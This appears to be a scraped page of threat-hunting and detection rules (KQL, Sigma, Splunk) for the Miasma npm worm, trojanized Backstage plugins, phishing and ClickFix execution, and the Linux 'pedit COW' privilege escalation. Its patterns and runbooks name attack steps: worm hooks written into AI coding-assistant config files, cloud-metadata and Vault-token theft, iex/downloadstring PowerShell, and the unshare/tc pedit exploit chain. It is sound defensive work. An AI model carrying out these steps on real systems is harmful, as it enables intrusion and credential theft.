Hunts the infectHost routine that backdoors AI coding-assistant configuration files for re-execution: .claude/settings.json (SessionStart hook), .vscode/tasks.json (folderOpen), .cursor/rules/, .aider.conf.yml, and .github/copilot-instructions.md. Filters to writes performed by node/bun/npm so legit editor saves are excluded. Rationale: Directly maps the article's infectHost target list (Claude Code SessionStart hook in .claude/settings.json, VS Code folderOpen in .vscode/tasks.json, .cursor/rules, .aider.conf.yml, .github/copilot-instructions.md); requiring a node/bun writer separates the malware from legitimate IDE saves. Cross-checked against: • https://www.stepsecurity.io/blog/immobiliarelabs-npm-packages-compromised • https://semgrep.dev/blog/2026/miasma-v2-self-spreading-npm-worm-now-uses-malicious-bindinggyp-file-and-compromises-57-packages/
ATT&CKT1546 T1554
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A developer's VS Code / Cursor extension (which runs under node) legitimately writing tasks.json or rules on project open
  • Aider itself updating .aider.conf.yml during normal use
  • Dotfile-management tooling (chezmoi/yadm) restoring AI-assistant configs
  • An MCP/agent framework legitimately writing a SessionStart hook into .claude/settings.json
Suppression filter
| where not (InitiatingProcessFileName in~ ("code","cursor","aider") and InitiatingProcessParentFileName in~ ("code","cursor"))
Response runbook
1) Triage: open the written config and inspect the hook/command body — Miasma injects a shell/JS command into the SessionStart, folderOpen, or rules entry; benign saves contain no execution directive. 2) Contain: revert the config from version control, remove the injected hook, and isolate the host if a command was present. 3) Hunt: enumerate every repo/home dir on the host for the same five config files, and check whether the SessionStart hook already fired (child processes of the AI assistant).
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified")
| where FolderPath has_any ("/.claude/settings.json", "/.vscode/tasks.json", "/.cursor/rules", "/.aider.conf.yml", "copilot-instructions.md") or FileName in~ ("settings.json","tasks.json",".aider.conf.yml","copilot-instructions.md")
| where FolderPath has_any (".claude",".vscode",".cursor",".aider.conf.yml","copilot-instructions.md")
| where InitiatingProcessFileName in~ ("node","bun","sh","bash","dash","npm","node-gyp")
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where TargetFilePath has_any (".claude/settings.json", ".vscode/tasks.json", ".cursor/rules", ".aider.conf.yml", "copilot-instructions.md")
| where ActingProcessName has_any ("node","bun","sh","bash","dash","npm","node-gyp")

Cloud instance-metadata harvesting from npm/node install context (Miasma credential theft) AIActions on Objectives Medium
Hunts the Miasma harvester reaching AWS IMDS (169.254.169.254) or ECS task-metadata (169.254.170.2) from a node/bun/npm/node-gyp process — the exact endpoints the article lists for cloud credential theft. Scoped to install-tooling parents and the Bun stage so it isn't a long-running app's normal SDK traffic. Rationale: Uses the article's literal credential-source endpoints (IMDS 169.254.169.254 and ECS metadata 169.254.170.2) tied to the npm/node/Bun execution context; metadata access from package-install tooling (vs a steady-state app) is the high-fidelity differentiator. Sentinel left empty because ImNetworkSession carries no initiating-process attribution to bind the IMDS hit to node/bun. Cross-checked against: • https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm • https://www.wiz.io/blog/miasma-supply-chain-attack-targeting-redhat-npm-packages
ATT&CKT1552.005 T1552.007
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node.js app on EC2/ECS legitimately using the AWS SDK to refresh instance-role credentials via IMDS
  • CI tooling (e.g. node-based deploy scripts) that queries instance identity at job start
  • Container health agents written in node polling task metadata
  • Infra-as-code node CLIs (CDK) resolving region/account from IMDS
Suppression filter
| where InitiatingProcessCommandLine !has "aws-sdk" and InitiatingProcessParentFileName !in~ ("systemd","pm2","forever")
Response runbook
1) Triage: confirm the calling process lineage — IMDS access from a process whose parent is npm/node-gyp/sh during a package install, or from a Bun temp process, is not normal SDK usage. 2) Contain: isolate the host/runner and immediately rotate the instance-role / task-role credentials and any cloud keys reachable from that role; review CloudTrail for use of those creds from new IPs. 3) Hunt: check for follow-on reads of /proc/<Runner.Worker pid>/mem, Vault token files (/home/runner/.vault-token, /root/.vault-token, /run/secrets/VAULT_TOKEN), and .ssh/ on the same host.
DeviceNetworkEvents

| where RemoteIP in ("169.254.169.254","169.254.170.2")

Compromised @immobiliarelabs Backstage plugin on disk (binding.gyp + index.js / known hashes) AIDelivery Medium
Inventory/IOC detection for the trojanized @immobiliarelabs/backstage-plugin-gitlab(-backend) and backstage-plugin-ldap-auth(-backend) packages. Clean releases never shipped a binding.gyp, so the presence of binding.gyp or the 5 MB index.js inside those package paths — or any file matching the three published malicious SHA256s — confirms a compromised version was installed. Rationale: Built on the article's affected-package matrix plus the three published SHA256 IOCs; a binding.gyp inside these specific Backstage plugin directories is itself anomalous because the clean 2.1.1-era releases shipped neither binding.gyp nor a 5 MB index.js. Cross-checked against: • https://www.stepsecurity.io/blog/immobiliarelabs-npm-packages-compromised • https://vulnerability.circl.lu/vuln/mal-2026-6527 • https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/
ATT&CKT1195.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security team intentionally staging the malicious tarball in an isolated analysis sandbox
  • A cached npm tarball retained on a build agent after remediation (already-known, low risk)
  • An offline mirror/proxy (Verdaccio/Artifactory) holding a quarantined copy for inspection
  • Hash collision is implausible — SHA256 matches are definitive
Response runbook
1) Triage: confirm the exact package@version from the path against the affected matrix (gitlab/gitlab-backend 3.0.3–7.0.2, 1.0.1, 2.1.2; ldap-auth(-backend) 1.1.3/1.1.4–5.2.1) and check whether node-gyp executed it (install actually ran). 2) Contain: pin/roll back to a known-clean version, purge the tarball from caches and lockfiles, isolate affected build agents, and rotate every credential reachable from that host/CI job. 3) Hunt: pivot to binding.gyp execution, Bun temp execution, IMDS access, and AI-assistant config writes on the same hosts; sweep the registry/repo org for republished (worm-propagated) packages from any maintainer account touched by these runners.

| where Timestamp > ago(30d)
| where (FolderPath has "@immobiliarelabs" and (FolderPath has "backstage-plugin-gitlab" or FolderPath has "backstage-plugin-ldap-auth") and FileName in~ ("binding.gyp","index.js"))
    or SHA256 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108","da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707","ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, FileSize, SHA256
| order by Timestamp desc

    or TargetFileSHA256 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108","da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707","ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90")

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

title: FakeCaptcha / ClickFix - Clipboard-Injected PowerShell from Explorer
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d06
status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - IT-driven scripted automation that admins paste-launch
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

    spawning script-host or LOLBin children. Strongest signal when

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90") or SHA1 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90") or MD5 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90") or SHA1 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90") or MD5 in~ ("ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["ceff7c51d70832c3ec8dd2744b606a23b3c924ef664ae23439b9b742ea154108", "da39146ef451d1b174a24d00b1e2a45cd38d54e849737f8f35333dcb22175707", "ef641e956f91d501b748085996303c96a64d67f63bfeef0dda175e5aa19cca90"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

New Linux pedit COW Exploit Enables Root Access by Poisoning Cached Binaries

The Hacker News
2026-06-26 6 use cases 2 techniques 6 kill-chain phases detected

A flaw in the Linux kernel's traffic-control subsystem can let a local unprivileged user gain root on affected systems. CVE-2026-46331, nicknamed "pedit COW," is an out-of-bounds write in the packet-editing action (act_pedit) that corrupts shared page-cache memory. A&nbsp;public, working exploit&nbsp;appeared within a day of the CVE assignment on June 16. Red Hat&nbsp;rates the flaw as

tc pedit action invocation by non-root user (CVE-2026-46331 pedit COW trigger) AIExploitation High
Hunts the exploitation primitive of CVE-2026-46331: an unprivileged user invoking the traffic-control 'tc' utility to configure an act_pedit packet-editing action with offset 'munge' edits — the exact step that triggers the out-of-bounds page-cache write. Legitimate tc pedit use is admin/root-driven traffic shaping, so non-root pedit/munge invocation is high-fidelity. Rationale: Anchors on the article's exact exploitation primitive — the 'tc' binary plus act_pedit 'munge'/'action' keywords — and the unprivileged-to-root scenario by excluding root. tc pedit is normally root-only traffic shaping, making non-root pedit invocation a near-zero-FP signal. Cross-checked against Red Hat RHSB-2026-008 and Ubuntu's tracker which confirm act_pedit reachability as the precondition. Cross-checked against: • https://access.redhat.com/security/vulnerabilities/RHSB-2026-008 • https://ubuntu.com/security/CVE-2026-46331 • https://tuxcare.com/blog/pedit-cow-cve/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46331
ATT&CKT1068
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Network admin or config-management (Ansible/Puppet) running tc with pedit rules for legitimate QoS/header rewriting as a non-root but sudo-elevated service account
  • Container networking plugins (CNI) configuring tc pedit for packet mangling under a service account
  • Network testing/benchmarking tools that script tc pedit actions
  • Security tooling that probes tc capabilities during a vulnerability scan
Suppression filter
| where not (InitiatingProcessFileName in~ ("ansible","python3","puppet","chef-client","salt-minion") and AccountName in~ ("svc-netauto","automation"))
Response runbook
1) Triage: pull the full tc command line and the invoking AccountName/parent process. Confirm whether the user is a known network-automation account; check if act_pedit was loaded (lsmod | grep act_pedit) and whether unprivileged user namespaces are enabled on the host. 2) Contain: isolate the host from the network and suspend the user session; the article states to treat the host as compromised even after dropping page cache. Capture memory before reboot. 3) Hunt: on the same host search for preceding unshare/user-namespace creation, modprobe act_pedit, and any subsequent /bin/su execution or new root shells; sweep other multi-tenant/CI/Kubernetes nodes for the same tc pedit pattern.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName == "tc"
| where ProcessCommandLine has "pedit"
| where ProcessCommandLine has_any ("munge","action")
| where AccountName !in~ ("root")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName == "tc" or ActingProcessName endswith "/tc"
| where ActingProcessCommandLine has "pedit"
| where ActingProcessCommandLine has_any ("munge","action")
| where ActorUsername !in~ ("root")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: tc pedit Action Invocation by Non-Root User (CVE-2026-46331 pedit COW)
id: 7c2f1a64-9b3e-4d51-8a0c-2e6f4b9d1a23
status: experimental
description: Detects an unprivileged invocation of the tc utility configuring an act_pedit packet-editing action with munge offset edits, the trigger for the CVE-2026-46331 page-cache out-of-bounds write.
references:
  - https://access.redhat.com/security/vulnerabilities/RHSB-2026-008
  - https://thehackernews.com/2026/06/new-linux-pedit-cow-exploit-enables.html
author: SOC Detection Engineering
date: 2026/06/26
tags:
  - attack.t1068
  - attack.privilege_escalation
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: '/tc'
    CommandLine|contains|all:
      - 'pedit'
      - 'munge'
  filter_root:
    User: 'root'
  condition: selection and not filter_root
falsepositives:
  - Administrator or automation configuring legitimate tc pedit traffic-shaping rules
level: high
source:linux.auditd @process.name:tc @process.command_line:*pedit* (@process.command_line:*munge* OR @process.command_line:*action*) -@user.name:root
#event_simpleName=ProcessRollup2 ImageFileName=/\/tc$/i
| CommandLine=/pedit/i
| CommandLine=/(munge|action)/i
| NOT UserName=/^root$/i
| groupBy([aid, ComputerName, UserName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=tc Processes.process="*pedit*" (Processes.process="*munge*" OR Processes.process="*action*") Processes.user!=root by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=tc Processes.process="*pedit*" (Processes.process="*munge*" OR Processes.process="*action*") Processes.user!=root by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | sort - lastTime
act_pedit kernel module load via modprobe/insmod (CVE-2026-46331 precondition) AIInstallation Medium
Hunts the explicit loading of the act_pedit kernel module — one of the two preconditions for CVE-2026-46331. The article's own mitigation blocks this module from loading, so an explicit load on a host that doesn't run tc traffic-shaping is a strong pre-exploit indicator. Rationale: Uses the article's exact module name 'act_pedit' (also the subject of the mitigation `install act_pedit /bin/true`). An explicit module load on a host not doing traffic shaping is a high-signal pre-exploit step; FP rate is bounded to environments that genuinely use tc pedit. Corroborated by Red Hat RHSB-2026-008 which lists module blocking as the primary mitigation. Cross-checked against: • https://access.redhat.com/security/vulnerabilities/RHSB-2026-008 • https://tuxcare.com/blog/pedit-cow-cve/ • https://ubuntu.com/security/CVE-2026-46331
ATT&CKT1547.006 T1068
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Hosts that legitimately use tc pedit for QoS/header rewriting loading the module at boot via systemd-modules-load
  • CNI/container-networking stacks loading act_pedit as part of network setup
  • An admin manually running lsmod/modprobe while investigating this very CVE (mitigation verification)
  • Configuration-management runs that pre-load kernel modules from a baseline list
Suppression filter
| where InitiatingProcessFileName !in~ ("systemd-modules-load","systemd") and InitiatingProcessCommandLine !has "systemd-modules-load"
Response runbook
1) Triage: identify the parent process and user that invoked modprobe/insmod act_pedit; determine whether the host has any legitimate tc pedit traffic-shaping config (check /etc/systemd-modules and tc qdisc/filter rules). 2) Contain: if the load is unexpected, deploy the modprobe blocklist (install act_pedit /bin/true) across the affected node group and prioritise kernel patching on multi-tenant/CI/Kubernetes nodes. 3) Hunt: correlate for a following tc pedit/munge invocation (UC1) and unprivileged user-namespace creation (UC3) on the same host within minutes; sweep the fleet for other unexpected act_pedit loads.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("modprobe","insmod","kmod")
| where ProcessCommandLine has "act_pedit"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("modprobe","insmod","kmod")
| where ActingProcessCommandLine has "act_pedit"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: act_pedit Kernel Module Load (CVE-2026-46331 Precondition)
id: b1d9e037-4a6c-4f28-9e51-7c0a2d8f6b14
status: experimental
description: Detects explicit loading of the act_pedit kernel module via modprobe/insmod/kmod, a precondition for the CVE-2026-46331 pedit COW privilege-escalation exploit.
references:
  - https://access.redhat.com/security/vulnerabilities/RHSB-2026-008
  - https://thehackernews.com/2026/06/new-linux-pedit-cow-exploit-enables.html
author: SOC Detection Engineering
date: 2026/06/26
tags:

  - attack.t1068
  - attack.privilege_escalation

  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/modprobe'
      - '/insmod'
      - '/kmod'
    CommandLine|contains: 'act_pedit'
  condition: selection
falsepositives:
  - Hosts that legitimately use tc pedit traffic shaping and load the module at boot or on demand
level: medium
source:linux.auditd @process.name:(modprobe OR insmod OR kmod) @process.command_line:*act_pedit*
#event_simpleName=ProcessRollup2 ImageFileName=/\/(modprobe|insmod|kmod)$/i
| CommandLine=/act_pedit/i
| groupBy([aid, ComputerName, UserName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name=modprobe OR Processes.process_name=insmod OR Processes.process_name=kmod) Processes.process="*act_pedit*" by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name=modprobe OR Processes.process_name=insmod OR Processes.process_name=kmod) Processes.process="*act_pedit*" by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | sort - lastTime
Unprivileged user + network namespace creation via unshare (CVE-2026-46331 CAP_NET_ADMIN entry) AIExploitation Medium
Hunts the novel entry point of CVE-2026-46331: a non-root user creating a user namespace together with a network namespace (via unshare), which grants namespace-local CAP_NET_ADMIN — the capability the exploit needs to configure tc act_pedit. Combined user+net namespace creation by an unprivileged user immediately before tc activity is the exploit's enabling step. Rationale: Targets the article's stated 'what is new here' — unprivileged user-namespace creation yielding CAP_NET_ADMIN — by matching unshare with both user-ns and net-ns flags (long and combined short forms) from a non-root user. The user+net pairing distinguishes exploit setup from generic unshare use. Red Hat and the article both cite disabling unprivileged user namespaces as a mitigation that 'breaks rootless containers/sandboxes,' which defines the FP set. Cross-checked against: • https://access.redhat.com/security/vulnerabilities/RHSB-2026-008 • https://ubuntu.com/security/CVE-2026-46331 • https://thehackernews.com/2026/06/new-linux-pedit-cow-exploit-enables.html
ATT&CKT1611 T1068
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Rootless container runtimes (podman, buildah, runc) creating user+net namespaces for normal containers
  • Sandboxed browsers (Chrome/Firefox) using unprivileged user namespaces for their sandbox
  • CI/CD sandbox runners (GitLab/GitHub self-hosted) spinning up isolated namespaces per job
  • Developers manually testing network namespaces with unshare -Urn for tooling
  • systemd services with PrivateNetwork/PrivateUsers creating namespaces
Suppression filter
| where InitiatingProcessFileName !in~ ("podman","buildah","runc","crun","conmon","chrome_sandbox","chrome","firefox","gitlab-runner","systemd","containerd-shim") and InitiatingProcessCommandLine !has "sandbox"
Response runbook
1) Triage: review the full unshare command line and parent process; determine whether the parent is a known rootless-container/browser/CI binary (podman, runc, chrome_sandbox, gitlab-runner). Note the user and host role (multi-tenant/CI/K8s nodes are highest priority). 2) Contain: if not attributable to a sanctioned sandbox, suspend the user session and isolate the host; consider setting kernel.unprivileged_userns_clone=0 / user.max_user_namespaces=0 on at-risk nodes after change testing. 3) Hunt: correlate within a short window for a subsequent 'tc ... pedit ... munge' invocation (UC1) by the same user/host and for act_pedit module loads (UC2); if found, treat as active exploitation and escalate to IR.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName == "unshare"
| where ProcessCommandLine matches regex @"(?i)(--net|-[a-z]*n[a-z]*)"
| where ProcessCommandLine matches regex @"(?i)(--user|--map-root-user|-[a-z]*[ur][a-z]*)"
| where AccountName !in~ ("root")
| where AccountName !endswith "$"
